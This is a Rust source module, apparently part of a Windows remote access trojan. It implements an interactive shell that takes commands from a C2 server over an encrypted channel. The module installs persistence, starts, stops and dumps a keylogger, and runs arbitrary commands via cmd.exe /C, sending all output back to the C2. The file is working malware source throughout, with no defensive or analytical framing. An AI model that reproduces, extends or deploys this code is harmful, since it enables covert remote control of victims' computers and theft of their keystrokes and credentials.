//! Interactive command shell — dispatches commands received from the C2
//! server and returns output.
//!
//! Built-in commands: `cd`, `persist`, `keylog_start`, `keylog_stop`,
//! `keylog_dump`, `exit` / `q`. Everything else is executed as a system
//! command via `cmd.exe /C`.
//!
//! This module is only compiled on Windows.

#![cfg(target_os = "windows")]

use crate::config::Config;
use crate::keylogger;
use crate::network::C2Channel;
use crate::persistence;
use std::process::Command;

/// Run the interactive command shell over an encrypted C2 channel.
pub fn command_shell(mut channel: C2Channel, cfg: &Config) {
    // Send banner
    let _ = channel.send_str("[*] Shell ready. Commands: cd, persist, keylog_start, keylog_stop, keylog_dump, exit\n");

    let mut keylogger_handle: Option<std::thread::JoinHandle<()>> = None;

    loop {
        // Receive command
        let cmd = match channel.recv_string() {
            Ok(Some(s)) => s.trim().to_string(),
            _ => break,
        };

        if cmd.is_empty() {
            continue;
        }

        match cmd.as_str() {
            "exit" | "q" => {
                let _ = channel.send_str("[*] Exiting...\n");
                cfg.stop();
                break;
            }

            s if s.starts_with("cd ") => {
                let dir = &s[3..];
                match std::env::set_current_dir(dir) {
                    Ok(()) => {
                        let cwd = std::env::current_dir()
                            .map(|p| p.display().to_string())
                            .unwrap_or_else(|_| "???".into());
                        let _ = channel.send_str(&format!("[+] Changed directory to: {cwd}\n"));
                    }
                    Err(_) => {
                        let _ = channel.send_str("[-] Failed to change directory\n");
                    }
                }
            }

            "persist" => {
                match persistence::install() {
                    Ok(()) => {
                        let _ = channel.send_str("[+] Persistence created successfully\n");
                    }
                    Err(e) => {
                        let _ = channel.send_str(&format!("[-] Failed to create persistence: {e}\n"));
                    }
                }
            }

            "keylog_start" => {
                if keylogger::is_running() {
                    let _ = channel.send_str("[!] Keylogger already running\n");
                } else {
                    let handle = std::thread::spawn(|| keylogger::run());
                    keylogger_handle = Some(handle);
                    let _ = channel.send_str("[+] Keylogger started\n");
                }
            }

            "keylog_stop" => {
                if keylogger::is_running() {
                    keylogger::stop();
                    if let Some(h) = keylogger_handle.take() {
                        let _ = h.join();
                    }
                    let _ = channel.send_str("[+] Keylogger stopped\n");
                } else {
                    let _ = channel.send_str("[!] Keylogger not running\n");
                }
            }

            "keylog_dump" => {
                match keylogger::dump() {
                    Some(data) => {
                        let _ = channel.send_str(&data);
                    }
                    None => {
                        let _ = channel.send_str("[!] No keylogger data available\n");
                    }
                }
            }

            _ => {
                // Execute as system command
                let output = execute_command(&cmd);
                let _ = channel.send_str(&output);
            }
        }
    }

    // Cleanup keylogger if still running
    if keylogger::is_running() {
        keylogger::stop();
        if let Some(h) = keylogger_handle.take() {
            let _ = h.join();
        }
    }
}

/// Execute a system command via `cmd.exe /C` and return stdout + stderr.
fn execute_command(cmd: &str) -> String {
    match Command::new("cmd.exe").args(["/C", cmd]).output() {
        Ok(output) => {
            let mut result = String::from_utf8_lossy(&output.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stderr.is_empty() {
                result.push_str(&stderr);
            }
            if result.is_empty() {
                result = "Command executed successfully (no output)\n".into();
            }
            result
        }
        Err(e) => format!("Error: Failed to execute command: {e}\n"),
    }
}
